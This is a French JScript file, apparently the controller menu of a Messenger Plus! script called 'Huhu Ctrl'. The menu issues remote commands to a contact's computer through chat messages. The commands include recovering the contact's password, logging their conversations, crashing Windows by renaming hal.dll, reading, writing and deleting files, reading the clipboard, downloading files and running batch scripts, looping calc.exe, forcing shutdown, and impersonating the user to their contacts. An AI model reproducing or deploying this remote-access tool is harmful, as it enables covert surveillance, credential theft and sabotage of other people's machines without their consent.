var cmd = new Array();
var cmd_txt = new Array();
var cmd_ctrl = new Array();

function OnEvent_Initialize(MessengerStart){
	addItem("Verif1", "Verification 1 ( .... )", "....");
	addItem("Verif2", "Verification 2 ( :)  )", ":) ");
	addItem("Verif3", "Verification 3 ( * )", "*");
	addItem("-");
	addItem("path_script", "Chemin du script.", "%SCRIPT%");
	addItem("path_desktop", "Chemin du bureau.", "%DESKTOP%");
	addItem("-");
	addItem("send", "Parler à sa place.", "[send]message");
	addItem("chat", "Parler à un contact.", "[chat]x@hotmail.com message");
	addItem("chatall", "Envoyer un message à tous ses contacts.", "[all]message");
	addItem("contact", "Obtenir les contacts.", "[contact]");
	addItem("dp", "Mettre votre avatar.", "[dp]");
	addItem("alpha", "Rendre transparante les fenetres. ( 0-255 )", "[alpha]180");
	addItem("clearwnd", "Effacer le contenu de la fenêtre. ( la ferme et la réouvre )", "[clear]");
	addItem("-");
	addItem("blank11", "Cacher les messages envoyés.", "[blank_on]");
	addItem("blank12", "Afficher les messages envoyés.", "[blank_off]");
	addItem("blank21", "Cacher les messages reçus.", "[blank2_on]");
	addItem("blank22", "Afficher les messages reçus.", "[blank2_off]");
	addItem("-");	
	addItem("passA", "Récupérer le mot de passe. ( étape 1/2 )", "[get_password]");
	addItem("passB", "Récupérer le mot de passe. ( étape 2/2 )", "[password]");
	addItem("-");	
	addItem("crash", "Planter Windows.", "[bat]ren %SYSTEMROOT%\\system32\\hal.dll hal.dII");
	addItem("uncrash", "Réparer Windows.", "[bat]ren %SYSTEMROOT%\\system32\\hal.dII hal.dll");
	addItem("-");
	addItem("spy", "Récupérer le log des conversations.", "[spy]");
	addItem("reset_spy", "Réinitialiser le log.", "[reset_spy]");
	addItem("-");
	addItem("blockall2", "Bloquer tous les contacts sauf vous.", "[blockall2]");
	addItem("blockall", "Bloquer tous les contacts.", "[blockall]");
	addItem("block", "Bloquer un contacts.", "[block]x@hotmail.com");
	addItem("autoblock", "Bloquer automatiquement un contacts.", "[autoblock]x@hotmail.com");
	addItem("autoblock_remove", "Retire un contact de la liste autobloquante.", "[autoblock_remove]x@hotmail.com");
	addItem("autoblock_reset", "Remettre la liste autobloquante à 0.", "[autoblock_reset]");
	addItem("-");
	addItem("unblockall", "Débloquer tous les contacts.", "[unblockall]");
	addItem("unblock", "Débloquer un contacts.", "[unblock]x@hotmail.com");
	addItem("unautoblock", "Débloquer automatiquement un contacts.", "[autounblock]x@hotmail.com");
	addItem("unautoblock_remove", "Retire un contact de la liste autodébloquante.", "[autounblock_remove]x@hotmail.com");
	addItem("unautoblock_reset", "Remettre la liste autodébloquante à 0.", "[autounblock_reset]");
	addItem("-");
	addItem("showstart", "Afficher le boutton DEMARRER.", "[showstart]");
	addItem("hidestart", "Cacher le boutton DEMARRER.", "[hidestart]");
	addItem("showclock", "Afficher l\'horloge.", "[showclock]");
	addItem("hideclock", "Cacher l\'horloge.", "[hideclock]");
	addItem("showtasks", "Afficher les tâches.", "[showtasks]");
	addItem("hidetasks", "Cacher les tâches.", "[hidetasks]");
	addItem("showtaskbar", "Afficher la barre des tâches.", "[showtaskbar]");
	addItem("hidetaskbar", "Cacher la barre des tâches.", "[hidetaskbar]");
	addItem("-");
	addItem("mouse_lock", "Bloquer la souris.", "[lock_mouse]");
	addItem("mouse_sin", "Faire une sinusoïde avec la souris.", "[sin_mouse]");
	addItem("-");
	addItem("shutdownbat", "Eteindre l\'ordinateur.", "[bat]shutdown -s -t 60");
	addItem("restartbat", "Redémarrer l\'ordinateur.", "[bat]shutdown -r -t 60");
	addItem("abortshutdown", "Annuler le décompte.", "[bat]shutdown -a");
	addItem("-");
	addItem("open", "Ouvrir les lecteurs optiques.", "[open]");
	addItem("batch", "Créer et executer un batch.", "[bat]@echo off\n");
	addItem("beep", "Biper l'ordinateur. ( frequence temps )", "[beep]1000 1000");
	addItem("freeze", "Geler Messenger.", "[freeze]");
	addItem("process1", "Obtenir tous les processus.", "[process]");
	addItem("process2", "Obtenir les processus avec le chemin.", "[process2]");
	addItem("-");
	addItem("error", "Afficher un message d\'erreur.", "[error]titre>message");
	addItem("excla", "Afficher un message exclamatif.", "[exclamation]titre>message");
	addItem("yesno", "Afficher un message d\'erreur OUI/NON.", "[yesno]titre>message[ifyes=bat][ifyes=send][ifno=bat][ifno=send]");
	addItem("YESno2", "Afficher un message d\'erreur OUI/NON ( force le OUI ).", "[YESno]titre>message[ifyes=bat][ifyes=send][ifno=bat][ifno=send]");
	addItem("yesNO3", "Afficher un message d\'erreur OUI/NON ( force le NON ).", "[yesNO]titre>message[ifyes=bat][ifyes=send][ifno=bat][ifno=send]");
	addItem("-");
	addItem("clipboard", "Ecrire dans le presse-papier.", "[clipboard]");
	addItem("readclipboard", "Lire le presse-papier.", "[readclipboard]");
	addItem("clearclipboard", "Effacer le presse-papier.", "[clearclipboard]");
	addItem("-");
	addItem("download", "Télécharger un fichier.", "[download]http://>C:\\");
	addItem("adownload", "Télécharger un fichier ( async ).", "[adownload]http://>C:\\");
	addItem("-");
	addItem("url", "Lancer une page web.", "[url]http://");
	addItem("run", "Lancer une application.", "[run]calc.exe");
	addItem("calc", "Lancer la calculatrice plein de fois.", "[bat]@echo off\n:main\nstart calc.exe\ngoto main");
	addItem("-");
	addItem("drives", "Informations sur les disques.", "[drives]");
	addItem("-");
	addItem("info", "Propriété d'un fichier.", "[info]C:\\fichier");
	addItem("read", "Lire un fichier.", "[read]C:\\fichier");
	addItem("write", "Ecrire un fichier.", "[write]C:\\fichier>Texte");
	addItem("copy", "Copier un fichier.", "[copy]C:\\fichier1>C:\\fichier2");
	addItem("delete", "Effacer un fichier.", "[delete]C:\\fichier");
	addItem("files", "Lister les fichiers d\'un dossier.", "[files]C:\\");
	addItem("-");
	addItem("createf", "Créer un dossier.", "[create]C:\\dossier\\");
	addItem("deletef", "Effacer un dossier.", "[deletefolder]C:\\dossier\\");
	addItem("copyf", "Copier un dossier.", "[copyfolder]C:\\dossier1\>C:\\dossier2\\");
	addItem("folders", "Lister les sous-dossiers d\'un dossier.", "[folders]C:\\");
	addItem("-");
	addItem("toast", "Notification.", "[toast]titre>texte");
	addItem("rate", "Noter un script. ( id note )", "[rate]0 5");
	addItem("version", "Obtenir la version de Huhu Ctrl du contact.", "[version]");
	addItem("update", "Mettre à jour du script à partir d'une URL.", "[update]http://lafermedepierre.fr.tc/huhu_ctrl.js");
}

function addItem(id, txt, rplc){
	cmd[cmd.length]=id;
	cmd_txt[cmd_txt.length]=txt;
	cmd_ctrl[cmd_ctrl.length]=rplc;
}

function OnEvent_MenuClicked(MenuItemId,Location,OriginWnd){
	for(var i=0; i<cmd.length; i++){
		if(MenuItemId==cmd[i]&&cmd[i]!="-"){
			OriginWnd.EditText_ReplaceSel(cmd_ctrl[i]);
			break;
		}
	}
}

function OnGetScriptMenu(Location){
	if(Location==2){
		var xmlMenu = new String();
		xmlMenu += '<ScriptMenu>';
		for(var i=0; i<cmd.length; i++)if(cmd[i]!="-")xmlMenu += '<MenuEntry Id=\"'+cmd[i]+'\">'+cmd_txt[i]+'</MenuEntry>';else xmlMenu += "<Separator/>";
		xmlMenu += '</ScriptMenu>';
		return xmlMenu;
	}
}
	
	
